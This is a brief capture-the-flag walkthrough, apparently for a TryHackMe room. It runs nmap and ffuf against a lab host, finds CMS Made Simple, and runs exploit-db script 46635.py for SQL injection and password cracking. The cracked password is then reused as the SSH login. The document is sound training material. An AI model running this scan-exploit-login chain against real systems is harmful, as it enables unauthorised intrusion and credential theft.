@@ -1,0 +1,120 @@
+(ONLY USER FLAG FOUND)
+
+START THE CHALLENGE WITH A NMAP SCAN ------------------------------
+
+-------------------------------------SCAN RESULTS ---------------------------------------------------
+Host is up (0.29s latency).
+Not shown: 997 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.44.43
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 2 disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+AS WE CAN SEE PORT----21,80,2222----- ARE OPEN .
+
+
+NOW I STARTED USING FFUF TO SEARCH FOR ANYOTHER HIDDEN DIRECTORY 
+
+----------------------------Scan results ---------------------------------------
+command:- ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.10.225.18/FUZZ 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.225.18/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [318/4614] :: Job [1/1] :: 26 req/sec :: Duration: [0:02:01] :: Errors: 240 ::
+
+index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 281ms]
+robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33, Duration: 298ms]
+server-status           [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 500ms]
+simple                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 436ms]<<--   open this 
+:: Progress: [4614/4614] :: Job [1/1] :: 72 req/sec :: Duration: [0:02:49] :: Errors: 240 ::
+
+
+-----------------------------------------------------------
+
+
+AFTER DOING THE FFUF SCAN YOU CAN SEE THERE IS A WEBPAGE CALLED SIMPLE AND WHEN YOU OPEN IT YOU CAN SEE SOMETHING CALLED CMS MADE SIMPLE 2.2
+
+DO A SEARCHSPLOIT SEARCH FOR THIS AND THE OUTPUT IS GOING TO BE 
+
+
+earchsploit cms made simple 2.2
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                                                                      |  Path
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                                | php/webapps/4810.txt
+CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)                                                                      | php/webapps/48779.py
+CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload                                                                        | php/webapps/48742.txt
+CMS Made Simple 2.2.14 - Persistent Cross-Site Scripting (Authenticated)                                                            | php/webapps/48851.txt
+CMS Made Simple 2.2.15 - 'title' Cross-Site Scripting (XSS)                                                                         | php/webapps/49793.txt
+CMS Made Simple 2.2.15 - RCE (Authenticated)                                                                                        | php/webapps/49345.txt
+CMS Made Simple 2.2.15 - Stored Cross-Site Scripting via SVG File Upload (Authenticated)                                            | php/webapps/49199.txt
+CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                                                                       | php/webapps/44976.py
+CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                                                                       | php/webapps/45793.py
+CMS Made Simple < 2.2.10 - SQL Injection                                                                                            | php/webapps/46635.py
+------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
+
+THE EXPLOIT WE ARE GOIN TO BE FOUCUSING ON IS CMS MADE SIMPLE < 2.2.10 - SQL Injection
+
+
+
+USE COMMAND 
+
+>>>locate 46635.py
+/usr/share/exploitdb/exploits/php/webapps/46635.py
+>>>cp /usr/share/exploitdb/exploits/php/webapps/46635.py /home/kali/Desktop/tryhackme/CTF/exploit.py
+>>>python3 exploit.py -u http://10.10.225.18/simple/ --crack  -w rockyou.txt
+password - <password>>
+
+USE THE OBTAINED PASSWORD AS SSH CRED USER NAME CAN BE FOUND IN robots.txt
+
+FIND USER.TXT IN THE SYSTEM
+
+
+
+
+
+
+
+
